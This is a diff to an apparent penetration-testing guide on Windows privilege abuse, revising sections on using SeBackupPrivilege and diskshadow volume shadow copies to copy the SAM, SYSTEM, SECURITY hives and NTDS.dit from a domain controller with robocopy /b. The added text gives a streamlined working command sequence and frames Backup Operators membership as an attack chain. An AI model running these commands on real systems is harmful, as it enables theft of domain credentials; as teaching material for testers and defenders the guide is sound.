@@ -253,25 +253,23 @@ The differences between tools are essentially in Step 1 and Step 2 - what endpoi
 
 ### Path 2 - SeBackupPrivilege (Shadow Copy Abuse)
 
-SeBackupPrivilege allows a process to bypass normal file security checks when performing backup operations. In practice this means tools using backup semantics (like `robocopy /b`) can read files that would otherwise be inaccessible due to ACLs or OS locks. Note that SeBackupPrivilege alone doesn't grant the ability to create VSS snapshots - creating a shadow copy requires additional privileges or running as an administrator. The combination of SeBackupPrivilege and robocopy /b is useful for reading from an already-existing snapshot, or when elevated enough to create one.
+SeBackupPrivilege allows a process to bypass normal file security checks when performing backup operations. In practice this means tools using backup semantics (like `robocopy /b`) can read files that would otherwise be inaccessible due to ACLs or OS locks.
+
+The most impactful use is extracting NTDS.dit from a Domain Controller. Even with SeBackupPrivilege, NTDS.dit cannot be directly copied while the NTDS service is running — it's exclusively locked by the Extensible Storage Engine. The solution is VSS: create a snapshot of C:, mount it, and copy ntds.dit from the snapshot using `robocopy /b`. The snapshot bypasses the file lock, and SeBackupPrivilege bypasses the ACL.
+
+> **Context:** This attack path is typically associated with the **Backup Operators** group, which grants both SeBackupPrivilege and SeRestorePrivilege. If you find yourself as a member of Backup Operators on a DC — this is the chain.
 
 ```cmd
-:: Create diskshadow script
-echo set verbose on > shadow.txt
-echo set metadata C:\Temp\meta.cab >> shadow.txt
-echo set context clientaccessible >> shadow.txt
-echo set context persistent >> shadow.txt
-echo begin backup >> shadow.txt
+:: Create diskshadow script (must have CRLF line endings - use unix2dos if created on Linux)
+echo set context persistent nowriters > shadow.txt
 echo add volume C: alias tk >> shadow.txt
 echo create >> shadow.txt
 echo expose %tk% Z: >> shadow.txt
-echo end backup >> shadow.txt
-echo exit >> shadow.txt
 
 :: Run the script
 diskshadow.exe /s shadow.txt
 
-:: Copy sensitive files from the snapshot
+:: Copy sensitive files from the snapshot using backup semantics
 robocopy /b Z:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY
 robocopy /b Z:\Windows\NTDS C:\Temp ntds.dit
 ```
@@ -494,21 +492,15 @@ Before moving on, here's the difference between these three approaches - they so
 - You don't have SYSTEM but have `SeBackupPrivilege` only - for example through membership in Backup Operators. As SYSTEM you already have SeBackupPrivilege by default, so this method works either way. But if you only have SeBackupPrivilege without SYSTEM - VSS + `robocopy /b` is your path since you can't run arbitrary commands as SYSTEM
 
 ```cmd
-:: Create diskshadow script
-echo set verbose on > shadow.txt
-echo set metadata C:\Temp\meta.cab >> shadow.txt
-echo set context clientaccessible >> shadow.txt
-echo set context persistent >> shadow.txt
-echo begin backup >> shadow.txt
+:: Create diskshadow script (must have CRLF line endings - use unix2dos if created on Linux)
+echo set context persistent nowriters > shadow.txt
 echo add volume C: alias snap >> shadow.txt
 echo create >> shadow.txt
 echo expose %snap% Z: >> shadow.txt
-echo end backup >> shadow.txt
-echo exit >> shadow.txt
 
 diskshadow.exe /s shadow.txt
 
-:: Copy files from the shadow copy
+:: Copy files from the shadow copy using backup semantics
 robocopy /b Z:\Windows\System32\Config C:\Temp SAM SYSTEM SECURITY
 
 :: NTDS.dit only exists on Domain Controllers - skip on terminal servers/workstations
